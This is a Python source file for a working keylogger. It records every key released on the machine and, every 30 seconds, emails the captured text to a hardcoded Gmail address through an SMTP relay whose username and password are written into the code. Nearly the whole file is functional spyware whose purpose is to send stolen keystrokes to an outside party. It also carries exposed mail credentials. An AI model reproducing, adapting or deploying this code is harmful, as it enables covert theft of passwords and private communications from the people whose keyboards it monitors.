
import os

try:
    import keyboard
    import smtplib
    from threading import Timer
    from datetime import datetime
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
except:
    os.system("pip install -r requirements.txt")
 
class Config:
   SEND_REPORT_EVERY = 30  # in seconds
   EMAIL_ADDRESS = "it.c0nt1n3ntal@gmail.com"
   SMTP_SERVER = "smtp.mailersend.net"
   SMTP_PORT = 587
   SMTP_USERNAME = "MS_yA4y9Q@trial-3yxj6ljpew0ldo2r.mlsender.net"
   SMTP_PASSWORD = "oFENPhUJMs7TOQAf"
   SMTP_TOKEN = "oFENPhUJMs7TOQAf"

class Logger:
   def __init__(self):
       self.log = ""
 
 
   def add_key(self, key_name):
       print(f"Key logged: {key_name}")  # Debugging output
       self.log += key_name if len(key_name) == 1 else f"[{key_name.upper()}]"
 
 
   def clear_log(self):
       self.log = ""
 
class Reporter:
   def __init__(self, logger):
       self.logger = logger
       self.timer = None
 
 
   def start_timer(self):
       self.timer = Timer(Config.SEND_REPORT_EVERY, self.report)
       self.timer.daemon = True
       self.timer.start()
 
 
   def report(self):
       if self.logger.log:
           self.send_email(self.logger.log)
           self.logger.clear_log()
           print(self.logger.log)
       self.start_timer()
 
   def send_email(self, log_data):
       msg = MIMEMultipart("alternative")
       msg["From"] = Config.SMTP_USERNAME
       msg["To"] =  Config.EMAIL_ADDRESS
       msg["Subject"] = "Keylogger Report"
       msg.attach(MIMEText(log_data, "plain"))
       try:
           with smtplib.SMTP(Config.SMTP_SERVER, Config.SMTP_PORT) as server:
               server.starttls()
               server.login(Config.SMTP_USERNAME, Config.SMTP_PASSWORD)
               server.send_message(msg)
               print(f"Email sent at {datetime.now()}")  # Debugging output
       except Exception as e:
           print(f"Failed to send email: {e}")

def on_key_release(event):
   logger.add_key(event.name)
 
if __name__ == "__main__":
   logger = Logger()
   reporter = Reporter(logger)
   keyboard.on_release(on_key_release)
   reporter.start_timer()
   keyboard.wait()